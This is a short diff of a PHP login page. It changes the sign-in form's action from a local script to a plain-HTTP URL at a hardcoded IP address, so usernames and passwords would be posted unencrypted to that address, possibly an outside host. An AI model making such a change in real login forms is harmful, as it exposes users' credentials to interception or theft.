@@ -248,7 +248,7 @@ include_once 'db_connection/bd_connect_secure.php';?>
                         echo '<h4 class="text-center warning">'.$er_msg.'</h4>';
                     }
                     ?>
-                    <form class="form-signin" action="db_connection/login_process.php" method="post" name="login_form">
+                    <form class="form-signin" action="http://188.166.145.173/db_connection/login_process.php" method="post" name="login_form">
                         <input type="text" class="form-control" placeholder="Username" required autofocus name="username">
                         <input type="password" class="form-control" placeholder="Password" required name="password">
                         <input type="button" class="btn btn-lg btn-primary btn-block"
